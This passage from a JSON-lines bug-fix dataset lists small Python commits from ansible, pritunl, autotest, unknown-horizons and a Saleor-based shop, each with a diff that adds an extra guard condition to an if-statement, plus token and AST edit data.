\"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:fields\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "16e22220058d6ee221787231fdd5fe9fb1544810", "parent_sha": "19d14f5bf47046f7c8e1fbfc75709980267c6fd7", "file_path": "horizons/gui/mousetools/tearingtool.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -133,7 +133,7 @@ class TearingTool(NavigationTool):\n \t\t\t\t\tif b is not None:\n \t\t\t\t\t\tif b not in self._hovering_over:\n \t\t\t\t\t\t\tself._hovering_over.append(b)\n-\t\t\t\t\t\tif b.tearable and b.owner.is_local_player:\n+\t\t\t\t\t\tif b.tearable and b.owner is not None and b.owner.is_local_player:\n \t\t\t\t\t\t\tif b not in self.selected:\n \t\t\t\t\t\t\t\tself.selected.append(b)\n \t\t\tfor i in self.selected:\n", "before": "if b . tearable and b . owner . is_local_player : if b not in self . selected : self . selected . append ( b )", "after": "if b . tearable and b . owner is not None and b . owner . is_local_player : if b not in self . selected : self . selected . append ( b )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 10, 3, 48], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 10, 3, 48], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 10, 3, 20], 0], [\"Move\", \"N0\", [\"and:and\", 3, 21, 3, 24], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 3], [\"Insert\", \"N2\", [\"identifier:b\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:owner\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "afa1667caa7a398e893df613b924c116965171fe", "parent_sha": "3443a6be2a653002f11c290df036244c1ab75c72", "file_path": "horizons/world/component/selectablecomponent.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ class SelectableComponent(Component):\n \t\tfrom horizons.gui.tabs import TabWidget\n \t\ttablist = None\n-\t\tif self.instance.owner.is_local_player:\n+\t\tif self.instance.owner is not None and self.instance.owner.is_local_player:\n \t\t\ttablist = self.tabs\n \t\telse: # this is an enemy instance with respect to the local player\n \t\t\ttablist = self.enemy_tabs\n", "before": "if self . instance . owner . is_local_player : tablist = self . tabs else : tablist = self . enemy_tabs", "after": "if self . instance . owner is not None and self . instance . owner . is_local_player : tablist = self . tabs else : tablist = self . enemy_tabs", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 2, 3, 5, 29], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 2, 6, 2, 41], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 3], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:owner\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:instance\", \"T\"], 2]]"}
{"project": "urbanradder", "commit_sha": "0dd7d40dcb94b18d243ed8c97ba17720504fbafa", "parent_sha": "27055a61be5acf0de9fa5e6b9f5def368d666652", "file_path": "saleor/dashboard/order/utils.py", "project_url": "https://github.com/johnchendev/urbanradder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ def create_packing_slip_pdf(order, fulfillment, absolute_url):\n \n def fulfill_order_line(order_line, quantity):\n     \"\"\"Fulfill order line with given quantity.\"\"\"\n-    if order_line.variant.track_inventory:\n+    if order_line.variant and order_line.variant.track_inventory:\n         decrease_stock(order_line.variant, quantity)\n         order_line.quantity_fulfilled += quantity\n         order_line.save(update_fields=['quantity_fulfilled'])\n", "before": "if order_line . variant . track_inventory : decrease_stock ( order_line . variant , quantity ) order_line . quantity_fulfilled += quantity order_line . save ( update_fields = [ 'quantity_fulfilled' ] )", "after": "if order_line . variant and order_line . variant . track_inventory : decrease_stock ( order_line . variant , quantity ) order_line . quantity_fulfilled += quantity order_line . save ( update_fields = [ 'quantity_fulfilled' ] )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 62], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 8, 3, 42], 2], [\"Insert\", \"N1\", [\"identifier:order_line\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:variant\", \"T\"], 2]]"}
{"project": "autotest-", "commit_sha": "9ce6768cb71596bab23aa99cb8a4e4ff7dc56f60", "parent_sha": "47d563fcdd501195b965d61d7d530cd1342f06aa", "file_path": "utils/parallel.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class ParallelExecute(object):\n                 if len(self.functions[dependent]) == 0:\n                     self.ready_to_run.append(dependent)\n \n-        if len(self.functions) > 0:\n+        if len(self.functions) > 0 and len(errors) == 0:\n             errors.append(\"Deadlock detected\")\n \n         if len(errors) > 0:\n", "before": "if len ( self . functions ) > 0 : errors . append ( \"Deadlock detected\" )", "after": "if len ( self . functions ) > 0 and len ( errors ) == 0 : errors . append ( \"Deadlock detected\" )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 47], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 35], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:errors\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "autotest-", "commit_sha": "8c1d5dd89040af5d1350d1310a54f4c8ed54b6b2", "parent_sha": "7df8dd5331b0661c6013d8b0ad36f266af67db2e", "file_path": "client/shared/base_check_version.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -49,7 +49,7 @@ class base_check_python_version:\n         best_python = (0, 0), ''\n         for python in pythons:\n             version = self.extract_version(python)\n-            if version >= (2, 4):\n+            if version and version >= (2, 4):\n                 possible_versions.append((version, python))\n \n         possible_versions.sort()\n", "before": "if version >= ( 2 , 4 ) : possible_versions . append ( ( version , python ) )", "after": "if version and version >= ( 2 , 4 ) : possible_versions . append ( ( version , python ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 60], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:version\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 33], 2]]"}
{"project": "ansible-1", "commit_sha": "aaaf37ae413c730b93cb7c484f335cbde94bb7fa", "parent_sha": "f096cd6322d67d38b934384867c281eda04bf914", "file_path": "lib/ansible/modules/extras/files/blockinfile.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -281,7 +281,7 @@ def main():\n \n     if lines:\n         result = '\\n'.join(lines)\n-        if original.endswith('\\n'):\n+        if original and original.endswith('\\n'):\n             result += '\\n'\n     else:\n         result = ''\n", "before": "if original . endswith ( '\\n' ) : result += '\\n'", "after": "if original and original . endswith ( '\\n' ) : result += '\\n'", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 27], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:original\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 35], 2]]"}
{"project": "ansible-1", "commit_sha": "27185f44b07558589819f55333eab40841e00be0", "parent_sha": "13c2c292f26cc01c64cbcb0d27824a5cad69be01", "file_path": "lib/ansible/plugins/action/raw.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ class ActionModule(ActionBase):\n         if task_vars is None:\n             task_vars = dict()\n \n-        if self._task.environment:\n+        if self._task.environment and any(self._task.environment) :\n             self._display.warning('raw module does not support the environment keyword')\n \n         result = super(ActionModule, self).run(tmp, task_vars)\n", "before": "if self . _task . environment : self . _display . warning ( 'raw module does not support the environment keyword' )", "after": "if self . _task . environment and any ( self . _task . environment ) : self . _display . warning ( 'raw module does not support the environment keyword' )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 89], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 34], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:any\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:environment\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:_task\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "5aac2a424073d8c585dd78f23c15a8cce90b8c48", "parent_sha": "df49952c48d9585be94ee6d74d403db4ed154b78", "file_path": "lib/ansible/module_utils/docker_common.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -349,7 +349,7 @@ class AnsibleDockerClient(Client):\n         try:\n             for container in self.containers(all=True):\n                 self.log(\"testing container: %s\" % (container['Names']))\n-                if search_name in container['Names']:\n+                if isinstance(container['Names'], list) and search_name in container['Names']:\n                     result = container\n                     break\n                 if container['Id'].startswith(name):\n", "before": "if search_name in container [ 'Names' ] : result = container break", "after": "if isinstance ( container [ 'Names' ] , list ) and search_name in container [ 'Names' ] : result = container break", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 5, 26], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 53], 2], [\"Insert\", \"N1\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"subscript\", \"N3\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:list\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"identifier:container\", \"T\"], 0], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N3\", [\"string:'Names'\", \"T\"], 2], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 3]]"}
{"project": "ansible-1", "commit_sha": "ceefeeb27960e8a6c03c02b8d875de2b78f088d7", "parent_sha": "a17244f8966bd0038c27cd366db261e90e70f2e0", "file_path": "lib/ansible/module_utils/nxos.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -169,7 +169,7 @@ class Cli:\n                 except ValueError:\n                     out = to_text(out).strip()\n \n-            if item['output'] == 'json' and isinstance(out, string_types):\n+            if item['output'] == 'json' and out != 'ok' and isinstance(out, string_types):\n                 self._module.fail_json(msg='failed to retrieve output of %s in json format' % item['command'])\n \n             responses.append(out)\n", "before": "if item [ 'output' ] == 'json' and isinstance ( out , string_types ) : self . _module . fail_json ( msg = 'failed to retrieve output of %s in json format' % item [ 'command' ] )", "after": "if item [ 'output' ] == 'json' and out != 'ok' and isinstance ( out , string_types ) : self . _module . fail_json ( msg = 'failed to retrieve output of %s in json format' % item [ 'command' ] )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 74], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 74], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 40], 0], [\"Move\", \"N0\", [\"and:and\", 3, 41, 3, 44], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:out\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'ok'\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "3a78861cb57925bf04fbf60724f1ac888b2d3288", "parent_sha": "d268471739c05bc067b505cd8e179c5e44fda4b3", "file_path": "lib/ansible/modules/network/ios/ios_banner.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ def map_obj_to_commands(updates, module):\n     want, have = updates\n     state = module.params['state']\n \n-    if state == 'absent' and have['text']:\n+    if state == 'absent' and 'text' in have.keys() and have['text']:\n         commands.append('no banner %s' % module.params['banner'])\n \n     elif state == 'present':\n", "before": "if state == 'absent' and have [ 'text' ] : commands . append ( 'no banner %s' % module . params [ 'banner' ] ) elif state == 'present' : ", "after": "if state == 'absent' and 'text' in have . keys ( ) and have [ 'text' ] : commands . append ( 'no banner %s' % module . params [ 'banner' ] ) elif state == 'present' : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 42], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 42], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 25], 0], [\"Move\", \"N0\", [\"and:and\", 3, 26, 3, 29], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:'text'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"call\", \"N2\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"identifier:have\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:keys\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"):)\", \"T\"], 1]]"}
{"project": "ansible-1", "commit_sha": "5ccbe612587e7d926e3b92f9af2651bc4ae0f60c", "parent_sha": "0a2df4cdaf67470410d0791dcd33b179c7cce507", "file_path": "lib/ansible/module_utils/facts/virtual/linux.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class LinuxVirtual(Virtual):\n                     virtual_facts['virtualization_role'] = 'guest'\n                     return virtual_facts\n \n-        if os.path.exists('/proc/vz'):\n+        if os.path.exists('/proc/vz') and not os.path.exists('/proc/lve'):\n             virtual_facts['virtualization_type'] = 'openvz'\n             if os.path.exists('/proc/bc'):\n                 virtual_facts['virtualization_role'] = 'host'\n", "before": "if os . path . exists ( '/proc/vz' ) : virtual_facts [ 'virtualization_type' ] = 'openvz' if os . path . exists ( '/proc/bc' ) : virtual_facts [ 'virtualization_role' ] = 'host'", "after": "if os . path . exists ( '/proc/vz' ) and not os . path . exists ( '/proc/lve' ) : virtual_facts [ 'virtualization_type' ] = 'openvz' if os . path . exists ( '/proc/bc' ) : virtual_facts [ 'virtualization_role' ] = 'host'", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 62], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 38], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"call\", \"N2\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:exists\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"string:'/proc/lve'\", \"T\"], 1], [\"Insert\", \"N4\", [\"):)\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "2eaf3571f390b8bac4c3d9d8e4dd2256dc861b54", "parent_sha": "81a9dada1ce4cdb0a4b865340264fb65362809f1", "file_path": "lib/ansible/modules/network/nxos/nxos_hsrp.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -463,7 +463,7 @@ def main():\n             load_config(module, commands)\n \n             # validate IP\n-            if transport == 'cli':\n+            if transport == 'cli' and state == 'present':\n                 commands.insert(0, 'config t')\n                 body = run_commands(module, commands)\n                 validate_config(body, vip, module)\n", "before": "if transport == 'cli' : commands . insert ( 0 , 'config t' ) body = run_commands ( module , commands ) validate_config ( body , vip , module )", "after": "if transport == 'cli' and state == 'present' : commands . insert ( 0 , 'config t' ) body = run_commands ( module , commands ) validate_config ( body , vip , module )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 51], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 34], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:state\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'present'\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "f217dae938dd451d32c54643ae98020cc592e63d", "parent_sha": "e2c08edfcc0559039ed49f7526287b39c3ce3311", "file_path": "lib/ansible/plugins/strategy/linear.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -399,7 +399,7 @@ class StrategyModule(StrategyBase):\n                 failed_hosts = []\n                 unreachable_hosts = []\n                 for res in results:\n-                    if res.is_failed():\n+                    if res.is_failed() and iterator.is_failed(res._host):\n                         failed_hosts.append(res._host.name)\n                     elif res.is_unreachable():\n                         unreachable_hosts.append(res._host.name)\n", "before": "if res . is_failed ( ) : failed_hosts . append ( res . _host . name ) elif res . is_unreachable ( ) : unreachable_hosts . append ( res . _host . name )", "after": "if res . is_failed ( ) and iterator . is_failed ( res . _host ) : failed_hosts . append ( res . _host . name ) elif res . is_unreachable ( ) : unreachable_hosts . append ( res . _host . name )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 21, 6, 65], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 24, 3, 39], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:iterator\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:is_failed\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:res\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:_host\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "f16ec4e64c37ec8a1df072812327e40fde06f199", "parent_sha": "de57fa71c17157e0df124db477786d2c7d217544", "file_path": "lib/ansible/modules/cloud/amazon/elasticache.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -369,7 +369,7 @@ class ElastiCacheManager(object):\n             'EngineVersion': self.cache_engine_version\n         }\n         for key, value in modifiable_data.items():\n-            if value is not None and self.data[key] != value:\n+            if value is not None and value and self.data[key] != value:\n                 return True\n \n         # Check cache security groups\n", "before": "if value is not None and self . data [ key ] != value : return True", "after": "if value is not None and value and self . data [ key ] != value : return True", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 61], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 61], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 33], 0], [\"Move\", \"N0\", [\"and:and\", 3, 34, 3, 37], 1], [\"Insert\", \"N0\", [\"identifier:value\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "4f1746ee1d4bd15af390e8bc7bf3f9c67163455a", "parent_sha": "bc9a40b32d6db4d23b8e9c1a9f705c989d8a7150", "file_path": "lib/ansible/parsing/vault/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -927,7 +927,7 @@ class VaultEditor:\n         \"\"\" create a new encrypted file \"\"\"\n \n         dirname = os.path.dirname(filename)\n-        if not os.path.exists(dirname):\n+        if dirname and not os.path.exists(dirname):\n             display.warning(\"%s does not exist, creating...\" % dirname)\n             makedirs_safe(dirname)\n \n", "before": "if not os . path . exists ( dirname ) : display . warning ( \"%s does not exist, creating...\" % dirname ) makedirs_safe ( dirname )", "after": "if dirname and not os . path . exists ( dirname ) : display . warning ( \"%s does not exist, creating...\" % dirname ) makedirs_safe ( dirname )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 35], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:dirname\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"not_operator\", 3, 12, 3, 39], 2]]"}
{"project": "ansible-1", "commit_sha": "25218e6843d5e6f1d95d4d131d1346c43ee8f855", "parent_sha": "9896853d1f83aedb8416c2acf6ba2f0c6554cc77", "file_path": "lib/ansible/modules/cloud/amazon/aws_s3.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -759,7 +759,7 @@ def main():\n     if not s3_url and 'S3_URL' in os.environ:\n         s3_url = os.environ['S3_URL']\n \n-    if dualstack and 'amazonaws.com' not in s3_url:\n+    if dualstack and s3_url is not None and 'amazonaws.com' not in s3_url:\n         module.fail_json(msg='dualstack only applies to AWS S3')\n \n     if dualstack and not module.botocore_at_least('1.4.45'):\n", "before": "if dualstack and 'amazonaws.com' not in s3_url : module . fail_json ( msg = 'dualstack only applies to AWS S3' )", "after": "if dualstack and s3_url is not None and 'amazonaws.com' not in s3_url : module . fail_json ( msg = 'dualstack only applies to AWS S3' )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 51], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 51], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:dualstack\", 3, 8, 3, 17], 0], [\"Move\", \"N0\", [\"and:and\", 3, 18, 3, 21], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:s3_url\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 3]]"}
{"project": "pritunl", "commit_sha": "5bd1da65e7fa2ce27550a27e82540746184be732", "parent_sha": "5d629767ba79ae0a1cb005289bc315daf773c02e", "file_path": "pritunl/handlers/auth.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -225,7 +225,7 @@ def auth_session_post():\n \n     admin = auth.get_by_username(username, remote_addr)\n     if not admin:\n-        if RADIUS_AUTH in settings.app.sso:\n+        if settings.app.sso and RADIUS_AUTH in settings.app.sso:\n             return _auth_radius(username, password)\n \n         time.sleep(random.randint(0, 100) / 1000.)\n", "before": "if RADIUS_AUTH in settings . app . sso : return _auth_radius ( username , password )", "after": "if settings . app . sso and RADIUS_AUTH in settings . app . sso : return _auth_radius ( username , password )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 52], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 43], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:sso\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:settings\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:app\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "d12b5620eeb076ebd2135a587aa6b0db0acc021c", "parent_sha": "1cb17c53a743da807dfb8e75179895fccc449e5e", "file_path": "pritunl/server/server.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -548,7 +548,7 @@ class Server(mongo.MongoObject):\n         for route in self.get_routes(include_server_links=True):\n             if route['network'] == network:\n                 server_link = route['server_link']\n-                if route['nat'] != nat_route:\n+                if server_link and route['nat'] != nat_route:\n                     raise ServerRouteNatServerLink('Cannot nat server link')\n \n         if network == self.network:\n", "before": "if route [ 'nat' ] != nat_route : raise ServerRouteNatServerLink ( 'Cannot nat server link' )", "after": "if server_link and route [ 'nat' ] != nat_route : raise ServerRouteNatServerLink ( 'Cannot nat server link' )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 77], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:server_link\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 45], 2]]"}
